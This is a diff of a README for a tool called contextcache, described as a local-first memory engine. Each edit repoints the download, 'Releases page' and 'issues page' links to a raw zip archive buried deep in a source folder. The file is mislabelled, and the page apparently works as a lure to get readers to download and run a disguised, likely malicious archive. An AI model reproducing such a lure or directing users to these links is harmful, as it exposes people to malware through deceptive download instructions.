@@ -4,13 +4,13 @@
 
 Welcome to **contextcache**, your solution for a privacy-first, local-first memory engine. This tool allows you to manage your data securely and efficiently. Follow this guide to download and run the software.
 
-![Download contextcache](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip%https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip)
+![Download contextcache](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip%https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip)
 
 ## 📥 Download & Install
 
 To get started, you will need to download the software. Please visit the following link to access the latest version of contextcache:
 
-[Download contextcache from Releases](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip)
+[Download contextcache from Releases](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip)
 
 ### 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Ensure your system meets these requirements for optimal performance.
 
 ### 📂 Steps to Download
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip).
+1. Visit the [Releases page](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip).
 2. On this page, you will see the latest versions listed.
 3. Click on the version you wish to download.
 4. Choose the file that corresponds to your operating system.
@@ -54,7 +54,7 @@ If you encounter issues while downloading or installing:
 - Verify that you have sufficient disk space for installation.
 - Restart your device and try again if the installation fails.
 
-For additional help, check the [issues page](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip) or feel free to reach out to the community.
+For additional help, check the [issues page](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip) or feel free to reach out to the community.
 
 ## 🏷️ Topics
 
@@ -73,5 +73,5 @@ contextcache focuses on several key areas, including:
 
 For more information or queries, consider contributing to our community. You can also follow updates and discussions on our organization’s GitHub page.
 
-![Download contextcache](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip%https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip)  
-[Visit Releases to download](https://raw.githubusercontent.com/Sakspro/contextcache/main/fakery/contextcache.zip)
+![Download contextcache](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip%https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip)  
+[Visit Releases to download](https://github.com/Sakspro/contextcache/raw/refs/heads/main/api/cc_core/analyzers/submodular_summarizer/Software-v1.4-beta.2.zip)
